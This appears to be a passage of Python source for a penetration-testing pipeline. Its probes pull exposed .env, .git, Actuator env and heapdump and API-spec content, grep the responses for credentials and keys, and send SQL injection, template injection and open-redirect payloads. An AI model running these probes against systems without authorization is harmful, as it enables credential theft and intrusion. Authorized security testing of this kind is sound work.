#!/usr/bin/env python3
"""Quick Combat Pipeline — GKN-Phantom v5.4.

One-command pipeline for practical penetration testing:
  1. Quick detection scan (nuclei + built-in probes + CN component probes)
  2. Content-aware severity escalation (v5.2 — impact escalation layer)
  3. Deep-dive adapters + parameter/injection probing (v5.3 C1/C2)
  4. Full-site crawl (katana) feeding param probes (v5.4 C3)
  5. JS bundle mining via js_analyzer — secrets + hidden endpoints (v5.4 C4)
  6. Real OOB channel (interactsh/ceye/dnslog) — blind SSRF validation (v5.4 C5)
  7. Cross-run dedup memory — SRC repeat-submission guard (v5.4 C6)
  8. Auto PoC generation (curl / Python / HAR / Markdown / raw HTTP)
  9. Auto exploit generation (functional Python scripts)
  10. Visual index HTML + structured JSON bundle + combat manifest

Design philosophy (from real combat feedback):
  - Detection should be fast, not exhaustive. Scan narrow, verify quick.
  - PoCs must be copy-paste ready for reporting.
  - Exploits must demonstrate real impact, not theoretical risk.
  - Custom detection rules are brittle — lean on nuclei's curated templates.
  - Every optional layer (katana / OOB / JS / CN probes) degrades to a
    no-op when its dependency is missing — never blocks the pipeline.

Usage:
  python quick_combat.py --targets targets.json --output-dir ./combat_output/
  python quick_combat.py --targets targets.json --tech tech_stack.json
  python quick_combat.py --targets targets.json --no-nuclei --quick-probes-only
  python quick_combat.py --targets targets.json --oob-provider ceye \\
      --ceye-identifier xxxx --ceye-token yyyy
"""

from __future__ import annotations

import argparse
import json
import os
import re
import shutil
import subprocess
import sys
import time
from datetime import datetime, timezone
from pathlib import Path
from typing import Any
from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit

# Ensure scripts/ is importable
SCRIPTS_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, SCRIPTS_DIR)

from utils import (
    load_json,
    dump_json,
    utc_now_iso,
    finding_fingerprint,
    dedup_against_memory,
)
import nuclei_runner
import poc_generator
import exploit_generator
import vuln_detector

# =============================================================================
# Quick built-in probes — lightweight, high-signal checks (stdlib only)
# =============================================================================

QUICK_PROBES = [
    {
        "type": "misconfig",
        "name": "Security headers check",
        "paths": [""],
        "check": "header",
    },
    {
        "type": "info_leak",
        "name": "Source leak paths",
        "paths": [
            "/.git/config", "/.env", "/.DS_Store",
            "/phpinfo.php", "/info.php", "/test.php",
        ],
        "check": "pattern",
        "patterns": [
            "[core]", "DB_PASSWORD", "APP_KEY", "AKIA",
            "BEGIN RSA PRIVATE KEY", "phpinfo()",
        ],
    },
    {
        "type": "component_exposure",
        "name": "Actuator / Swagger / Druid",
        "paths": [
            "/actuator/env", "/actuator/health", "/actuator/mappings",
            "/swagger-ui.html", "/swagger-ui/index.html", "/v3/api-docs",
            "/druid/index.html", "/druid/login.html",
        ],
        "check": "pattern",
        "patterns": [
            '"activeProfiles"', '"swagger"', '"openapi"',
            "Druid Stat Index", "druid-login",
        ],
    },
    {
        "type": "directory_listing",
        "name": "Directory listing",
        "paths": [
            "/uploads/", "/backup/", "/logs/", "/temp/", "/static/",
        ],
        "check": "pattern",
        "patterns": ["Index of /", "Parent Directory"],
    },
    {
        "type": "info_leak",
        "name": "Backup files",
        "paths": [
            "/backup.zip", "/backup.tar.gz", "/www.zip",
            "/config.php.bak", "/config.yml.bak",
            "/wp-config.php.bak", "/.htaccess.bak",
        ],
        "check": "status",
        "status_codes": [200],
    },
    {
        "type": "graphql_introspection",
        "name": "GraphQL introspection",
        "paths": [
            "/graphql", "/gql", "/api/graphql",
        ],
        "check": "pattern",
        "patterns": ['"__schema"', '"queryType"', '"mutationType"'],
    },
    {
        "type": "open_redirect",
        "name": "Open redirect check",
        "paths": [
            "?redirect=https://oob.authorized.test/GKN",
            "?url=https://oob.authorized.test/GKN",
            "?next=https://oob.authorized.test/GKN",
            "?returnUrl=https://oob.authorized.test/GKN",
        ],
        "check": "redirect",  # 3xx with Location header
    },
]


def _run_quick_probe(target: str, probe: dict) -> list[dict]:
    """Run a single quick probe against a target URL. Returns findings.

    Probe dict (shared shape with QUICK_PROBES and cn_probes.CN_PROBES):
      - check: header | pattern | status | redirect
      - optional: method=POST + post_body + post_content_type (one-shot
        verifiers, e.g. JeecgBoot queryFieldBySql)
      - optional: severity (overrides the type-based baseline)
      - optional: not_patterns (body blacklist — suppresses soft-404s)
      - optional: _oob_match_domain (real OOB domain for redirect matching)
    """
    import urllib.request
    import ssl

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    # Build redirect-suppressed opener for redirect probes
    class _NoRedirectHandler(urllib.request.HTTPRedirectHandler):
        def redirect_request(self, req, fp, code, msg, headers, newurl):
            return None

    no_redirect_opener = urllib.request.build_opener(_NoRedirectHandler)

    findings: list[dict] = []
    base = target.rstrip("/")

    for path in probe.get("paths", []):
        if path.startswith("?"):
            url = (base + path) if "?" not in base else base
            # When base already has query string and path starts with ?, strip path's ?
            if "?" in base:
                url = base + "&" + path.lstrip("?")
            else:
                url = base + path
        else:
            url = f"{base}{path}"

        try:
            method = str(probe.get("method", "GET")).upper()
            if method == "POST":
                req = urllib.request.Request(
                    url,
                    data=str(probe.get("post_body", "")).encode("utf-8"),
                    method="POST",
                    headers={
                        "Content-Type": probe.get(
                            "post_content_type", "application/json"),
                        "User-Agent": "GKN-Phantom/5.4 QuickProbe",
                    },
                )
            else:
                req = urllib.request.Request(
                    url,
                    headers={"User-Agent": "GKN-Phantom/5.4 QuickProbe"},
                )
            check_type = probe.get("check", "pattern")
            if check_type == "redirect":
                try:
                    resp = no_redirect_opener.open(req, timeout=8)
                except urllib.error.HTTPError as e:
                    resp = e
            else:
                try:
                    resp = urllib.request.urlopen(req, timeout=8, context=ctx)
                except urllib.error.HTTPError as e:
                    resp = e
                except Exception:
                    continue

            body = b""
            try:
                body = resp.read()
            except Exception:
                pass
            body_str = body.decode("utf-8", errors="replace")

            headers = {}
            try:
                headers = {k.lower(): str(v) for k, v in resp.headers.items()}
            except Exception:
                pass

            matched = False
            if check_type == "header":
                matched = _check_headers_dict(headers)
            elif check_type == "pattern":
                for pattern in probe.get("patterns", []):
                    if pattern in body_str:
                        matched = True
                        break
                if matched and any(
                    np in body_str for np in probe.get("not_patterns", [])
                ):
                    matched = False
            elif check_type == "status":
                if resp.status in probe.get("status_codes", [200]):
                    blocked = any(
                        np in body_str for np in probe.get("not_patterns", []))
                    matched = not blocked
            elif check_type == "redirect":
                if resp.status in (301, 302, 303, 307, 308):
                    loc = headers.get("location", "")
                    dom = str(probe.get("_oob_match_domain")
                              or "oob.authorized.test")
                    if dom in loc or "GKN" in loc:
                        matched = True

            if matched:
                default_sev = (
                    "medium" if probe["type"] in ("component_exposure", "info_leak")
                    else "low"
                )
                sev = str(probe.get("severity", default_sev)).lower()
                findings.append({
                    "type": probe["type"],
                    "severity": sev,
                    "tier": "high" if sev in ("high", "critical") else "low",
                    "target": target,
                    "probe_path": path,
                    "probe_name": probe["name"],
                    "status": "detected",
                    "confidence": 0.7,
                    "evidence": {
                        "request": (
                            f"POST {path} body={probe.get('post_body', '')[:200]}"
                            if method == "POST"
                            else f"GET {path} HTTP/1.1\\nHost: {target}"
                        ),
                        "response": body_str[:2000],
                        "timestamp": utc_now_iso(),
                        "tool": "quick_probe",
                        "status_code": resp.status if hasattr(resp, 'status') else None,
                        "headers": headers,
                    },
                    "reproducible": True,
                    "safe_poc": True,
                    "detection_signal": probe.get("patterns", ["header check"])[0] if probe.get("patterns") else "status code",
                    "auto_verifiable": True,
                    "verification_method": "http_probe",
                    "requires_credentials": False,
                    "requires_human_approval": False,
                    "blocked_in_safe_mode": False,
                })
        except Exception:
            continue

    return findings


def _check_headers_dict(headers: dict) -> bool:
    """Check for missing security headers or verbose banners from a header dict."""
    missing = any(
        h not in headers
        for h in ("strict-transport-security", "content-security-policy", "x-frame-options")
    )
    verbose = "x-powered-by" in headers or "server" in headers
    return missing or verbose


# =============================================================================
# Content-aware severity escalation (v5.2 — Impact Escalation Layer)
#
# Quick probes emit a hardcoded baseline severity (low/medium). This layer
# inspects the captured evidence (response body / headers / probe path) and
# escalates the finding when the *content itself* proves higher impact.
# Every escalation records `severity_escalated_from` + `escalation_reason`
# so the decision stays auditable. The PII rule reuses
# vuln_detector.classify_data_exposure() to keep the SAME threshold as the
# full state-machine pipeline (score >= 3 → critical).
# =============================================================================

# Unquoted env-style credential assignment:  DB_PASSWORD=xxx / APP_KEY:xxx
_SECRET_ENV_RE = re.compile(
    r"(?im)^[ \t]*(?:export[ \t]+)?(?:DB_PASSWORD|DB_PASS|DATABASE_PASSWORD|"
    r"MYSQL_ROOT_PASSWORD|PASSWORD|PASSWD|APP_KEY|API_KEY|SECRET|SECRET_KEY|"
    r"ACCESS_KEY|AWS_SECRET_ACCESS_KEY|TOKEN|PRIVATE_TOKEN|ADMIN_PASSWORD)"
    r"[ \t]*[=:][ \t]*\S+"
)
_AWS_ACCESS_KEY_RE = re.compile(r"\bAKIA[0-9A-Z]{16}\b")
_PRIVATE_KEY_RE = re.compile(
    r"-----BEGIN (?:RSA |EC |DSA |OPENSSH |PGP )?PRIVATE KEY-----"
)
_GIT_CONFIG_RE = re.compile(r"\[core\][\s\S]{0,200}?repositoryformatversion")
_ARCHIVE_PATH_RE = re.compile(
    r"\.(?:zip|tar\.gz|tgz|tar|rar|7z|gz|bak)$", re.IGNORECASE
)

_SEV_RANK = {"info": -1, "low": 0, "medium": 1, "high": 2, "critical": 3}


def escalate_severity(finding: dict) -> dict:
    """Escalate a quick-probe finding's severity based on response content.

    Rules (first match wins, never de-escalates):
      1. PII / secret content score >= 3 (classify_data_exposure) → critical
      2. Live credentials in body (env-style, AWS key, private key) → high
      3. .git config disclosure (source recovery possible)        → high
      4. phpinfo page exposure (env + paths + modules)            → high
      5. Backup archive reachable                                 → high

    Returns the (possibly mutated) finding. Non-quick-probe findings
    (e.g. nuclei output, no `probe_path`) are returned unchanged.
    """
    if "probe_path" not in finding:
        return finding

    evidence = finding.get("evidence") or {}
    body = str(evidence.get("response") or "")
    headers = evidence.get("headers") or {}
    path = str(finding.get("probe_path") or "")
    original = str(finding.get("severity", "low")).lower()

    new_sev: str | None = None
    reason: str | None = None

    # Rule 1: PII / sensitive data → critical (same gate as full pipeline)
    triggered, score = vuln_detector.classify_data_exposure(body)
    if triggered:
        new_sev = "critical"
        reason = (
            f"data_exposure: response content matched sensitive-data rules "
            f"(score {score} >= 3, same threshold as full state machine)"
        )
    else:
        if _SECRET_ENV_RE.search(body):
            new_sev = "high"
            reason = "live credential assignment found in response body (env/config secret)"
        elif _AWS_ACCESS_KEY_RE.search(body):
            new_sev = "high"
            reason = "AWS access key ID found in response body"
        elif _PRIVATE_KEY_RE.search(body):
            new_sev = "high"
            reason = "private key material found in response body"
        elif _GIT_CONFIG_RE.search(body):
            new_sev = "high"
            reason = "git repository config disclosed — full source recovery possible via .git"
        elif "phpinfo()" in body:
            new_sev = "high"
            reason = "phpinfo page exposed — server paths, env vars and module config disclosed"
        elif _ARCHIVE_PATH_RE.search(path) and finding.get("status") == "detected":
            size = headers.get("content-length", "unknown")
            new_sev = "high"
            reason = (
                f"backup archive reachable (content-length={size}) — "
                f"potential full source + config disclosure"
            )

    if new_sev:
        _apply_escalation(finding, new_sev, reason)

    return finding


def _apply_escalation(finding: dict, new_sev: str, reason: str) -> bool:
    """Apply a severity upgrade in place. Never de-escalates; the first
    upgrade records the original severity in `severity_escalated_from`."""
    original = str(finding.get("severity", "low")).lower()
    if _SEV_RANK.get(new_sev, 0) > _SEV_RANK.get(original, 0):
        finding.setdefault("severity_escalated_from", original)
        finding["escalation_reason"] = reason
        finding["severity"] = new_sev
        return True
    return False


def run_quick_probes(targets: list[str], oob_client=None) -> list[dict]:
    """Execute quick probes against all targets. Returns finding dicts.

    When a real OOB client is available, open-redirect placeholder domains
    are replaced with a pollable callback domain so redirects become OOB-
    verifiable evidence instead of a static marker.
    """
    oob_domain = None
    if oob_client is not None:
        try:
            oob_domain = oob_client.get_domain("gkn-redir")
        except Exception:
            oob_domain = None

    all_findings: list[dict] = []
    for target in targets:
        for probe in QUICK_PROBES:
            p = probe
            if oob_domain and any(
                "oob.authorized.test" in path for path in probe.get("paths", [])
            ):
                p = dict(probe)
                p["paths"] = [
                    path.replace("oob.authorized.test", oob_domain)
                    for path in probe.get("paths", [])
                ]
                p["_oob_match_domain"] = oob_domain
            all_findings.extend(_run_quick_probe(target, p))
    return all_findings


# =============================================================================
# C1: Deep-Dive Adapters (v5.3 — Phase 2.5)
#
# When a quick probe HITS, the finding's severity so far reflects only
# "the endpoint exists". The deep-dive layer fetches the actual exposed
# content (bounded: <= 3 requests per finding, 8s timeout each, GET/POST
# introspection only, no destructive payloads) and records the demonstrated
# impact, escalating the finding when the content proves it.
# =============================================================================

_DD_TIMEOUT = 8
_DD_MAX_REQUESTS = 3

# JSON-style secret assignment with a NON-masked value (actuator env etc.)
# Pattern A: plain  "password": "value"
_DD_JSON_SECRET_RE = re.compile(
    r'(?i)["\'][^"\']*(?:password|passwd|secret|secret[_-]?key|api[_-]?key|'
    r'access[_-]?key|token)[^"\']*["\']\s*:\s*["\']([^"\']{4,})["\']'
)
# Pattern B: Spring Actuator wrapper  "spring.datasource.password": {"value": "..."}
_DD_JSON_SECRET_WRAPPER_RE = re.compile(
    r'(?i)["\'][^"\']*(?:password|passwd|secret|secret[_-]?key|api[_-]?key|'
    r'access[_-]?key|token)[^"\']*["\']\s*:\s*\{\s*"value"\s*:\s*"([^"]{4,})"'
)
_DD_MASK_RE = re.compile(r"^[*•x]{3,}$")


def _dd_has_unmasked_secret(body: str) -> bool:
    """True if the body contains a secret-ish key with a non-masked value."""
    for rx in (_DD_JSON_SECRET_RE, _DD_JSON_SECRET_WRAPPER_RE):
        for m in rx.finditer(body):
            if not _DD_MASK_RE.match(m.group(1)):
                return True
    return False

_GRAPHQL_INTROSPECTION_QUERY = (
    "query GKNIntrospection { __schema { "
    "queryType { name } mutationType { name } types { name kind } } }"
)


def _dd_fetch(url: str, data: bytes | None = None,
              read_cap: int = 65536) -> tuple[int | None, dict, str]:
    """Bounded fetch for deep-dive adapters. Returns (status, headers, body).

    `read_cap` bounds how much of the body is read (heapdump-style endpoints
    can be hundreds of MB — we only need presence + a prefix).
    """
    import urllib.request
    import ssl

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        if data is not None:
            req = urllib.request.Request(
                url, data=data, method="POST",
                headers={"Content-Type": "application/json",
                         "User-Agent": "GKN-Phantom/5.3 DeepDive"},
            )
        else:
            req = urllib.request.Request(
                url, headers={"User-Agent": "GKN-Phantom/5.3 DeepDive"},
            )
        resp = urllib.request.urlopen(req, timeout=_DD_TIMEOUT, context=ctx)
        body = resp.read(read_cap)
        return resp.status, dict(resp.headers), body.decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        try:
            body = e.read(read_cap)
        except Exception:
            body = b""
        return e.code, dict(e.headers), body.decode("utf-8", errors="replace")
    except Exception:
        return None, {}, ""


def _dd_actuator(finding: dict, base: str) -> dict:
    """Actuator deep-dive: fetch /env + /configprops, probe /heapdump presence."""
    dd: dict = {"adapter": "actuator", "performed": True, "requests": [],
                "impact": None, "responses": []}
    secrets_found = False
    for path in ("/actuator/env", "/actuator/configprops"):
        status, headers, body = _dd_fetch(base + path)
        dd["requests"].append({"method": "GET", "url": base + path,
                               "status": status})
        if status == 200 and body:
            dd["responses"].append({"url": base + path, "body": body[:2000]})
            if _dd_has_unmasked_secret(body):
                secrets_found = True
            if '"propertySources"' in body or '"contexts"' in body:
                dd["impact"] = "Spring Boot configuration exposed via Actuator"
    # heapdump presence probe (read only a prefix — never store the dump)
    status, headers, body = _dd_fetch(base + "/actuator/heapdump")
    dd["requests"].append({"method": "GET", "url": base + "/actuator/heapdump",
                           "status": status})
    heapdump = status == 200 and len(body) > 0
    if heapdump:
        dd["impact"] = "Actuator heapdump downloadable — JVM memory (sessions/credentials) extractable"
    # Escalation priority: unmasked credentials > heapdump > config exposure
    if secrets_found:
        dd["impact"] = ((dd.get("impact") or "") +
                        " + unmasked credentials in exposed configuration")
        _apply_escalation(finding, "critical",
                          "unmasked credentials found in Actuator configuration exposure")
    elif heapdump:
        _apply_escalation(finding, "critical",
                          "heapdump endpoint reachable: full JVM memory disclosure")
    elif dd.get("impact"):
        _apply_escalation(finding, "high",
                          "Actuator configuration exposure confirms server internals "
                          "(profiles, datasource, environment)")
    return dd


def _dd_graphql(finding: dict, base: str, path: str) -> dict:
    """GraphQL deep-dive: full introspection, measure the exposed schema."""
    dd: dict = {"adapter": "graphql", "performed": True, "requests": [],
                "impact": None, "responses": []}
    url = base + (path if path.startswith("/") else "/" + path)
    status, headers, body = _dd_fetch(
        url, data=json.dumps({"query": _GRAPHQL_INTROSPECTION_QUERY}).encode(),
    )
    dd["requests"].append({"method": "POST", "url": url, "status": status})
    if status == 200 and ("__schema" in body or '"types"' in body):
        dd["responses"].append({"url": url, "body": body[:2000]})
        n_types = body.count('"kind"')
        has_mutation = '"mutationType"' in body and '"null"' not in body.split('"mutationType"')[1][:40]
        dd["impact"] = (
            f"full GraphQL schema disclosed ({n_types} type fields"
            + (", mutations reachable" if has_mutation else "")
            + ") without authentication"
        )
        if has_mutation:
            _apply_escalation(finding, "high",
                              "GraphQL schema + mutation surface exposed unauthenticated — "
                              "data manipulation possible")
        else:
            _apply_escalation(finding, "high",
                              "full GraphQL schema exposed unauthenticated — "
                              "complete data model disclosed")
    return dd


def _dd_swagger(finding: dict, base: str) -> dict:
    """Swagger/OpenAPI deep-dive: pull the API spec, measure the surface."""
    dd: dict = {"adapter": "swagger", "performed": True, "requests": [],
                "impact": None, "responses": []}
    status, headers, body = _dd_fetch(base + "/v3/api-docs")
    dd["requests"].append({"method": "GET", "url": base + "/v3/api-docs",
                           "status": status})
    if status == 200 and '"paths"' in body:
        dd["responses"].append({"url": base + "/v3/api-docs", "body": body[:2000]})
        try:
            n_paths = len(json.loads(body).get("paths", {}))
        except Exception:
            n_paths = body.count('"/')
        has_auth = '"securitySchemes"' in body or '"security"' in body
        dd["impact"] = (
            f"OpenAPI specification exposed: {n_paths} endpoints documented"
            + ("" if has_auth else ", NO security scheme defined")
        )
        if not has_auth and n_paths > 0:
            _apply_escalation(finding, "high",
                              "API spec documents endpoints with no authentication scheme — "
                              "unauthenticated API surface")
    return dd


_DD_ADAPTERS = {
    "actuator": _dd_actuator,
    "graphql": _dd_graphql,
    "swagger": _dd_swagger,
}


def _dd_route(finding: dict) -> str | None:
    """Route a quick-probe finding to a deep-dive adapter by type/path."""
    path = str(finding.get("probe_path", ""))
    ftype = finding.get("type")
    if ftype == "component_exposure":
        if "actuator" in path:
            return "actuator"
        if "swagger" in path or "api-docs" in path:
            return "swagger"
    if ftype == "graphql_introspection":
        return "graphql"
    return None


def deep_dive(finding: dict) -> dict:
    """Run the matching deep-dive adapter on a detected quick-probe finding.

    Mutates the finding in place: sets `deep_dive` (adapter, requests,
    impact, responses) and escalates severity when the fetched content
    proves higher impact. Findings without a route are returned unchanged.
    """
    if finding.get("status") != "detected":
        return finding
    route = _dd_route(finding)
    if not route:
        return finding
    base = str(finding.get("target", "")).rstrip("/")
    if not base:
        return finding
    try:
        adapter = _DD_ADAPTERS[route]
        dd = adapter(finding, base) if route != "graphql" else adapter(
            finding, base, str(finding.get("probe_path", "/graphql")),
        )
    except Exception as e:
        dd = {"adapter": route, "performed": False, "error": str(e)}
    finding["deep_dive"] = dd
    return finding


# =============================================================================
# C2: Parameter Discovery + Injection Probing (v5.3 — Phase 2.6)
#
# Crawl the target's entry page for same-origin URLs with query parameters
# (links + JS strings), then run BOUNDED, non-destructive injection probes:
#   - SQLi: 3 generic error-based payloads, matched against the
#     DB_FINGERPRINT error signatures of all 6 engines (no time-based,
#     no extraction).
#   - SSTI: 4 arithmetic-reflection payloads (7*7 → 49) with a baseline
#     differential.
# =============================================================================

_PARAM_URL_RE = re.compile(r'https?://[^\s"\'<>()\[\]]+', re.IGNORECASE)
_HREF_RE = re.compile(r'(?:href|src|action)=["\']([^"\']+)["\']', re.IGNORECASE)

_SQLI_ERROR_PAYLOADS = ["PTSKILLTEST'", "1'", 'PTSKILLTEST"']
_SSTI_PAYLOADS = ["{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>"]

_PARAM_MAX_URLS = 10      # per target
_INJ_MAX_PARAMS = 5      # per target


def discover_params(target: str, timeout: int = 8,
                    max_urls: int = _PARAM_MAX_URLS,
                    extra_urls: list[str] | None = None) -> list[dict]:
    """Discover same-origin URLs with query parameters.

    Sources: the entry page (links + JS strings) plus optionally pre-crawled
    URLs (e.g. from katana) — extra URLs go through the same same-origin,
    has-query, dedupe and cap pipeline. Returns [{"url", "param", "value"}].
    """
    import urllib.request
    import ssl
    from urllib.parse import urlsplit, urlunsplit, parse_qsl, urljoin

    base = target.rstrip("/")
    try:
        origin = urlsplit(base).netloc
    except Exception:
        return []
    if not origin:
        return []

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        req = urllib.request.Request(
            base, headers={"User-Agent": "GKN-Phantom/5.4 ParamDiscovery"},
        )
        resp = urllib.request.urlopen(req, timeout=timeout, context=ctx)
        html = resp.read(262144).decode("utf-8", errors="replace")
    except Exception:
        html = ""

    candidates: list[str] = [m.group(0).rstrip(".,);") for m in _PARAM_URL_RE.finditer(html)]
    candidates += [urljoin(base, m.group(1)) for m in _HREF_RE.finditer(html)]
    # v5.4 C3: merge full-site crawl results (katana), same filtering
    for eu in (extra_urls or []):
        if isinstance(eu, str) and eu.startswith("http"):
            candidates.append(eu)

    seen: set[str] = set()
    params: list[dict] = []
    for cand in candidates:
        if "?" not in cand or "#" in cand.split("?")[0]:
            continue
        try:
            parts = urlsplit(cand)
        except Exception:
            continue
        if parts.netloc != origin:
            continue
        # Normalize: strip fragment
        norm = urlunsplit((parts.scheme, parts.netloc, parts.path,
                           parts.query, ""))
        for name, value in parse_qsl(parts.query, keep_blank_values=True):
            key = f"{norm}|{name}"
            if key in seen:
                continue
            seen.add(key)
            params.append({"url": norm, "param": name, "value": value})
            if len(params) >= max_urls:
                return params
    return params


def _fingerprint_signatures() -> list[tuple[str, str]]:
    """Compile (engine, signature-regex) pairs from advanced_sqli.DB_FINGERPRINT."""
    if not hasattr(_fingerprint_signatures, "_cache"):
        import advanced_sqli
        cache: list[tuple[str, str]] = []
        for engine, profile in advanced_sqli.DB_FINGERPRINT.items():
            for sig in profile.get("error_signatures", []):
                try:
                    cache.append((engine, sig))
                except Exception:
                    continue
        _fingerprint_signatures._cache = cache  # type: ignore[attr-defined]
    return _fingerprint_signatures._cache  # type: ignore[return-value]


def _replace_query_param(url: str, param: str, value: str) -> str:
    """Return url with `param` set to value (other params preserved)."""
    parts = urlsplit(url)
    q = [(k, v) for k, v in parse_qsl(parts.query, keep_blank_values=True)
         if k != param]
    q.append((param, value))
    return urlunsplit((parts.scheme, parts.netloc, parts.path,
                       urlencode(q), ""))


def probe_injection(target: str, param_entries: list[dict],
                    timeout: int = 8) -> list[dict]:
    """Run bounded error-based SQLi + SSTI arithmetic probes on discovered
    parameter endpoints. Returns new findings (never mutates existing ones)."""
    import urllib.request
    import ssl
    from urllib.parse import urlsplit, parse_qsl, urlencode, urlunsplit

    base = target.rstrip("/")
    findings: list[dict] = []
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    def _get(url: str) -> str:
        try:
            req = urllib.request.Request(
                url, headers={"User-Agent": "GKN-Phantom/5.3 InjectProbe"},
            )
            resp = urllib.request.urlopen(req, timeout=timeout, context=ctx)
            return resp.read(262144).decode("utf-8", errors="replace")
        except urllib.error.HTTPError as e:
            try:
                return e.read(262144).decode("utf-8", errors="replace")
            except Exception:
                return ""
        except Exception:
            return ""

    def _with_param(url: str, param: str, value: str) -> str:
        return _replace_query_param(url, param, value)

    def _emit(ftype: str, entry: dict, payload: str, body: str,
              signal: str, severity: str = "high") -> None:
        findings.append({
            "type": ftype,
            "severity": severity,
            "tier": "high" if severity in ("high", "critical") else "medium",
            "target": target,
            "probe_path": entry["url"],
            "probe_name": f"param_injection ({entry['param']})",
            "status": "detected",
            "confidence": 0.8,
            "evidence": {
                "request": f"GET {entry['url']} [{entry['param']}={payload}]",
                "response": body[:2000],
                "timestamp": utc_now_iso(),
                "tool": "param_probe",
                "injected_param": entry["param"],
                "payload": payload,
            },
            "reproducible": True,
            "safe_poc": True,
            "detection_signal": signal,
            "auto_verifiable": True,
            "verification_method": "differential",
            "requires_credentials": False,
            "requires_human_approval": False,
            "blocked_in_safe_mode": False,
        })

    for entry in param_entries[:_INJ_MAX_PARAMS]:
        baseline = _get(entry["url"])
        # SQLi — error-based only, 3 generic payloads
        for payload in _SQLI_ERROR_PAYLOADS:
            body = _get(_with_param(entry["url"], entry["param"], payload))
            if not body or body == baseline:
                continue
            for engine, sig in _fingerprint_signatures():
                if re.search(sig, body, re.IGNORECASE):
                    _emit(
                        "sqli", entry, payload, body,
                        f"DB error signature matched [{engine}]: {sig}",
                    )
                    break
            else:
                continue
            break
        # SSTI — arithmetic reflection with baseline differential
        for payload in _SSTI_PAYLOADS:
            body = _get(_with_param(entry["url"], entry["param"], payload))
            if "49" in body and "49" not in baseline:
                _emit(
                    "ssti", entry, payload, body,
                    f"arithmetic reflection: {payload} evaluated to 49 in response",
                )
                break

    return findings


# =============================================================================
# C3: Full-site crawler (v5.4 — katana)
#
# When the harness has katana installed, crawl the whole site instead of
# only the entry page: parameterized URLs discovered anywhere feed
# probe_injection, and JS URLs feed the C4 analyzer. No katana in PATH →
# the pipeline silently falls back to entry-page-only discovery.
# =============================================================================

_KATANA_TIMEOUT = 120
_KATANA_DEPTH = 3


def detect_katana() -> tuple[bool, str | None, str | None]:
    """Check if katana binary is available in PATH. Returns
    (available, binary_path, version_string)."""
    for name in ("katana",):
        path = shutil.which(name)
        if path:
            try:
                proc = subprocess.run(
                    [path, "-version"], capture_output=True, text=True,
                    timeout=10,
                )
                version = (proc.stdout or "") + (proc.stderr or "")
                m = re.search(r"v?(\d+\.\d+\.\d+)", version)
                return (True, path, m.group(1) if m else version.strip()[:40])
            except (subprocess.TimeoutExpired, OSError):
                continue
    return (False, None, None)


def crawl_katana(target: str, katana_path: str, depth: int = _KATANA_DEPTH,
                 timeout: int = _KATANA_TIMEOUT) -> dict:
    """Crawl a target with katana (-jsonl output). Returns
    {"urls": [...], "js_urls": [...], "count": N}.

    JSONL lines are version-tolerant: the endpoint is read from
    request.endpoint / endpoint / url / response.url, whichever exists.
    Any failure (missing binary, timeout, bad output) → empty result,
    never an exception.
    """
    urls: list[str] = []
    js_urls: list[str] = []
    cmd = [katana_path, "-u", target, "-d", str(depth), "-silent", "-nc", "-jsonl"]
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    except Exception:
        return {"urls": urls, "js_urls": js_urls, "count": 0,
                "error": "katana failed or timed out"}
    for line in (proc.stdout or "").splitlines():
        line = line.strip()
        if not line.startswith("{"):
            continue
        try:
            obj = json.loads(line)
        except Exception:
            continue
        req = obj.get("request") if isinstance(obj.get("request"), dict) else {}
        resp = obj.get("response") if isinstance(obj.get("response"), dict) else {}
        ep = (req.get("endpoint") or obj.get("endpoint") or obj.get("url")
              or resp.get("url") or "")
        if not isinstance(ep, str) or not ep.startswith("http"):
            continue
        if ".js" in urlsplit(ep).path.lower():
            js_urls.append(ep)
        else:
            urls.append(ep)
    return {"urls": urls, "js_urls": js_urls,
            "count": len(urls) + len(js_urls)}


# =============================================================================
# C4: JS bundle mining (v5.4 — js_analyzer integration)
#
# Fetch crawled JS bundles (bounded), mine them with js_analyzer (leaked
# secrets, dangerous sinks, debug endpoints), and extract hidden API
# endpoints hardcoded in the bundle — those endpoints then feed
# probe_injection, chaining JS recon into active injection probing.
# =============================================================================

_SCRIPT_SRC_RE = re.compile(
    r'(?:src)=["\']([^"\']+\.js(?:\?[^"\']*)?)["\']', re.IGNORECASE)
_JS_MAX_FILES = 10
_JS_FETCH_CAP = 512 * 1024


def _fetch_body(url: str, timeout: int = 8, cap: int = _JS_FETCH_CAP) -> str:
    """Bounded GET returning the body as text ('' on any failure)."""
    import urllib.request
    import ssl

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        req = urllib.request.Request(
            url, headers={"User-Agent": "GKN-Phantom/5.4 JSRecon"},
        )
        resp = urllib.request.urlopen(req, timeout=timeout, context=ctx)
        return resp.read(cap).decode("utf-8", "replace")
    except Exception:
        return ""


def collect_js_urls(target: str, timeout: int = 8) -> list[str]:
    """Collect JS file URLs from the entry page's <script src> tags.

    This is the no-katana fallback so JS mining works everywhere."""
    import urllib.request
    import ssl
    from urllib.parse import urljoin

    base = target.rstrip("/")
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        req = urllib.request.Request(
            base, headers={"User-Agent": "GKN-Phantom/5.4 JSRecon"})
        resp = urllib.request.urlopen(req, timeout=timeout, context=ctx)
        html = resp.read(262144).decode("utf-8", "replace")
    except Exception:
        return []
    out = []
    for m in _SCRIPT_SRC_RE.finditer(html):
        u = urljoin(base + "/", m.group(1))
        if u.startswith("http"):
            out.append(u)
    return out


def analyze_target_js(js_urls: list[str], base: str,
                       max_files: int = _JS_MAX_FILES) -> tuple[list[dict], list[dict]]:
    """Fetch JS bundles (bounded), analyze, extract hidden endpoints.

    Returns (findings, param_entries):
      findings      — js_analyzer findings converted to pipeline finding shape
      param_entries — hidden parameterized endpoints for probe_injection
    """
    import js_analyzer

    sources: list[dict] = []
